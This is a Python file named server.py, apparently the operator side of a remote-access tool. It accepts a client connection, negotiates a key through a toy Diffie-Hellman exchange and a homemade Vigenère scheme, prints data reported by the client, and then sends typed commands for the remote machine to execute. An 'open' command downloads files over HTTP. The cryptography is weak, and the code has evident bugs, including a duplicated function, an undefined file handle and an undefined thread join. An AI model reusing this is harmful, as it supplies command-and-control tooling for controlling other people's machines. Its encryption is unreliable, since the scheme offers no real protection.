#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: server.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Type: Build
    Build Version: 1.1
'''

# Import needed core python modules

import requests
import socket
import random
import time
import json

from sys import argv
from os  import walk
from os  import path
from os  import mkdir

# Global Variables

characters    = "\"\\?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'!&+*|`^@[]=#~-_<>(){}§$%µ£¤ç "
bits_per_char = len(bin(len(characters))) - 2
config  = json.load(open("res/config.json"))
HOST = config["host"]
PORT = config["port"]
WEBP = config["portWeb"]

g = int(random.uniform(100, 7000))
n = config["n"]
p = int(random.uniform(1, n))

g_step_1  = (g**p) % n
key       = 0
square    = ""
cipher    = ""

# File Manager Functions

def createSquare():
    square = [[" "] * len(characters)] * len(characters)

    for i in range(len(characters)):
        square[i] = characters[i:] + characters[:i]
    
    return square

def createSquare():
    square = [[" "] * len(characters)] * len(characters)

    for i in range(len(characters)):
        square[i] = characters[i:] + characters[:i]
    
    return square

def createCipher(key):
    return characters[:key % len(characters)]

def createEndCipher(cipher, message):
    i = 0
    endCipher = ""
    for p_i in range(len(message)):
        if i >= len(cipher):
            i = 0
        endCipher = endCipher + cipher[i]
        i = i + 1
    return endCipher

def VigenenereEncrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfMessageChar = -1
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if char == letter:
                indexInAlphabetOfMessageChar = i

            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i

            if indexInAlphabetOfCipherChar != -1 and indexInAlphabetOfMessageChar != -1:
                break
            
            i = i + 1
        
        if indexInAlphabetOfMessageChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            output = output + square[indexInAlphabetOfMessageChar][indexInAlphabetOfCipherChar]
        
        index = index + 1
    return output

def VigenenereDecrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i
                break
            
            i = i + 1
        
        if indexInAlphabetOfCipherChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            search = square[indexInAlphabetOfCipherChar]
            out    = ""
            i = 0
            for letter in search:
                if letter == char:
                    out = characters[i]
                    break
                i = i + 1
            if out == "":
                print("error")
            output = output + out
        
        index = index + 1
    return output

# Hasing Functions

def modify(message):
    output = ""

    for l in message:
        index  = characters.find(l)
        index2 = len(characters) - 1 - index
        letter = characters[index2]
        output = output + letter
    
    return output

def longify(message):
    output = ""
    for char in message:
        bin_number = str(bin(characters.find(char)))[2:]
        for i in range(bits_per_char - len(bin_number)):
            bin_number = "0" + bin_number
        output = output + bin_number
    return output

def delongify(message):
    output = ""
    for i in range(int(len(message) / bits_per_char)):
        char   = int(message[i * bits_per_char:i * bits_per_char + bits_per_char], 2)
        output = output + characters[char]
    return output

def encrypt(message):
    output = modify(message)
    output = VigenenereEncrypt(output)
    output = output[::-1]
    output = longify(output)
    return output

def decrypt(message):
    output = delongify(message)
    output = output[::-1]
    output = VigenenereDecrypt(output)
    output = modify(output)
    return output

# Create Socket Connection

def createConnexion(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen()
    conn, addr = sock.accept()

    return (sock, conn, addr)

def getTime():
    return int(round(time.time() * 1000))

def send(data):
    conn.sendall(encrypt(str(data)).encode())

def receiveData():
    rcv = decrypt(conn.recv(1024).decode("utf-8", "ignore"))

    return rcv

sock, conn, addr = createConnexion(HOST, PORT)

receivingInfo   = True
sendingCommands = False
diffie = True

while True:
    if diffie:
        conn.send(str(g).encode())
        time.sleep(0.2)
        conn.send(str(n).encode())
        time.sleep(0.2)
        conn.send(str(g_step_1).encode())

        while True:
            data = conn.recv(1024).decode()
            if data != "":
                key    = (int(data)**p) % n
                diffie = False
                square = createSquare()
                cipher = createCipher(key)
                print("Key : " + str(key))
                break
    
    if receivingInfo:
        received = receiveData()
        if received != "END":
            print(received)
        else:
            receivingInfo   = False
            sendingCommands = True
        
    if sendingCommands:
        command = input("Command To Execute ")
        if command != "END":
            last_rcv_time = getTime()

            if "open" in command:
                text = requests.get("http://"+HOST+"/"+command[5:]).text
                print(text)
                f = open("downloads/file"+command[len(command)-4:], "w+")
                f.write(text)
                f.close()
            else: 
                send(command)
                while True:
                    current_time = getTime()
                    if (current_time - last_rcv_time >= 2000):
                        break
                        
                    received = receiveData()
                    if received != "":
                        last_rcv_time = getTime()
                        if received != "END":
                            print(received)
                        else:
                            break
        else:
            send("END")
            f.close()
            sock.close()
            exit(0)

t1.join()